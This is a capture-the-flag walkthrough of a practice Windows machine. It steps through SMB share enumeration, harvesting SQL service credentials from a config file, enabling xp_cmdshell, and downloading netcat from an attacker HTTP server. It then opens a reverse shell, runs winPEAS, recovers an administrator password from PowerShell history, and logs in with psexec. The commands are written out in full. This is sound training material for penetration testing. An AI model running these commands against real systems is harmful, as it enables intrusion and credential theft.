# Enumeration

The nmap will show us:
```
> nmap -sV 10.129.221.7 -oN nmap

```

We will try to see which folders are share.
```console
> smbclient -L //10.129.221.7/
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

```

And then try to connect to **backups**:
```console
> smbclient //10.129.221.7/backups/
smb: \> ls
smb: \> get prod.dtsConfig
smb: \> exit
> cat prod.dtsConfig  
```

There we can see:
```
Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
```



Now we can try to login with the scripts **mssqlclient.py**.
We will use the credentials provides by the **prod.dtsConfig** file.
```console
> sudo python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.221.7 -windows-auth
```

# Foothold

Now we are in the SQL server. With the command **xp_cmdshell** we can try to execute the shell, but we will recieve the following error:
```sql
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell'
```

Now we need to activate xp_cmdshell. With the following command we can see all the config aviable.
```sql
SQL> sp_configure
```

We need to activate the advanced options:
```sql
SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
```

And then we can activate the shell:
```sql
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
```

Now we can get the **user flag**:
```sql
SQL> xp_cmdshell type C:\Users\sql_svc\Desktop\user.txt
```

We will make a reverse shell.
First we will start a nc in the port 443.
```console
> sudo nc -lvnp 443
```

Now we will create a http server in the same folder where we have the **nc64.exe** file.
```console
> sudo python3 -m http.server 80 
```

We need to download that file in the server. Because we don't have root access we will use the normal user.
```sql
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.88/nc64.exe -outfile nc64.exe"
```

The **http.server** will receive the following line:
```
10.129.221.7 - - [28/Feb/2022 12:51:53] "GET /nc64.exe HTTP/1.1" 200 -
```

Now we execute the command and send the cmd to the 443 port (where we are listening):
```sql
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.88 443"
```

# Privilege Escalation

Now we will need to use **winPEAS** to do the privilege escalation. We will change the prompt to powershell, and download the file.
```console
C:\Users\sql_svc\Downloads>powershell
PS C:\Users\sql_svc\Downloads> wget http://10.10.14.88/winPEASx64.exe -outfile winPEASx64.exe
```

In the http.server we can see that works:
```console
C:\Users\sql_svc\Downloads>powershell
10.129.221.7 - - [28/Feb/2022 13:01:29] "GET /winPEASx64.exe HTTP/1.1" 200 -
```

No we will execute the script:
```console
PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe
```

We can check the shell history for credentials (like **.bash_history**).
```console
PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type ConsoleHost_history.txt
        net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

With the password we have now we will use another script from impacket, **psexec.py**:
```console
> python3 psexec.py administrator@10.129.221.7
```

We can use the password from before and now we are in the Administrator user:
```console
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```
